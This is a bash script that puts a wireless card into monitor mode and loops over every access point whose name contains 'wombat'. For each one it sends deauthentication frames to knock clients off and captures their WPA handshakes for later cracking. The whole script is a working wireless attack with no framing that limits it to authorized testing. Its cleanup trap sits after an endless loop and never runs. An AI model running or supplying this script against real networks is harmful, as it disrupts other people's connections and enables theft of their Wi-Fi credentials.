#!/bin/bash

# Configuration
INTERFACE="wlp0s20f3"
MON_INTERFACE="${INTERFACE}mon"
TARGET_STRING="wombat"
OUTPUT_PREFIX="wombat_log"

# 1. Prepare Interface
sudo airmon-ng check kill
sudo airmon-ng start $INTERFACE

# 2. Initial Scan to find channels
echo "[+] Scanning for '$TARGET_STRING' targets (15 seconds)..."
# We run a quick scan to populate a CSV so we know which channels to hit
sudo timeout 15s airodump-ng --essid-regex ".*${TARGET_STRING}.*" -w "$OUTPUT_PREFIX" --output-format csv $MON_INTERFACE > /dev/null 2>&1

# 3. The Attack Loop
while true; do
    LATEST_CSV=$(ls -t ${OUTPUT_PREFIX}*.csv 2>/dev/null | head -n 1)
    
    if [ ! -f "$LATEST_CSV" ]; then
        echo "[!] No targets found. Retrying scan..."
        sudo timeout 10s airodump-ng --essid-regex ".*${TARGET_STRING}.*" -w "$OUTPUT_PREFIX" --output-format csv $MON_INTERFACE > /dev/null 2>&1
        continue
    fi

    # Extract BSSID and Channel (CSV columns 1 and 4)
    # This reads the CSV and gets: MAC,CHANNEL for every row matching "wombat"
    TARGETS=$(grep "$TARGET_STRING" "$LATEST_CSV" | cut -d',' -f1,4 | tr -d ' ' | sort -u)

    for target in $TARGETS; do
        BSSID=$(echo $target | cut -d',' -f1)
        CH=$(echo $target | cut -d',' -f2)

        # Skip if channel is invalid
        [[ ! "$CH" =~ ^[0-9]+$ ]] && continue

        echo "[+] Targeting $BSSID on Channel $CH"

        # Lock airodump to this specific channel in the background
        sudo airodump-ng -c $CH --bssid $BSSID -w "capture_$BSSID" $MON_INTERFACE > /dev/null 2>&1 &
        AIRO_PID=$!

        # Give it a second to tune
        sleep 2

        # Send Deauth
        echo "[*] Sending deauth to force handshake..."
        sudo aireplay-ng -0 10 -a $BSSID --ignore-negative-one $MON_INTERFACE > /dev/null 2>&1

        # Wait for capture (15 seconds per target)
        sleep 15

        # Kill airodump for this target and move to next
        kill $AIRO_PID
        wait $AIRO_PID 2>/dev/null
    done

    echo "[+] Finished cycle. Refreshing target list..."
    sleep 2
done

# Cleanup
trap "sudo airmon-ng stop $MON_INTERFACE; sudo systemctl restart NetworkManager; exit" SIGINT
